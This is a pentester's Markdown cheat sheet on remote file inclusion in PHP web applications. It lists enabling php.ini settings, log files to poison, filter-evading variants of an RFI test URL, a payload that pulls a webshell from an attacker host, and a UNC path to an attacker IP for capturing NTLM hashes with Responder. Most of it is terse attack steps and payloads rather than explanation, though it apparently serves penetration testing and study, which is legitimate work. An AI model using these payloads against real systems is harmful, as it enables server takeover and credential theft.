# Manual

## Enumeration

> [!IMPORTANT] Conditions
> Write the conditions...
> ```
$ cat /etc/php/7.4/apache2/php.ini
..[omitted]..
allow_url_fopen = On
allow_url_include = On
..[omitted]..
> ```

Poison log files to insert payload

```
/var/log/apache/access.log
/var/log/nginx/error_log
/var/log/auth.log
```

Send via email

Upload a webshell in a vulnerable file upload form

### Cross Platform

```
https://cirt.net/rfiinc.txt
HTTPS://cirt.net/rfiinc.txt
httPs://cirt.net/rfiinc.txt
```

## Exploit

### Cross Platform

> [!NOTE] INFO
> Look at `phpinfo()` for `disabled_functions`. If there are then check **hacktricks** in the reference links below.

```
http://<attacker_IP>/webshell.php
```

### Windows

Grab NTLM hashes with Responder (out of band).

> [!INFO]
> This doesn't require `allow_url_include` to be enabled.

```
\\<attacker_IP>\@leak.txt
```

---
## References

### Backlinks

- [[File Inclusion Payloads|File Inclusion Payloads]]

### Hacking Articles

- [Hacking Articles: Comprehensive Guide on Remote File Inclusion (RFI)](https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/)

### Defender's Note

- [Defender's Note: File Inclusion (Local/Remote)](https://notes.defendergb.org/web-sec/vuln/lfi-rfi)

### SecurityIdiots

- [SecurityIdiots: Guide to LFI](https://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)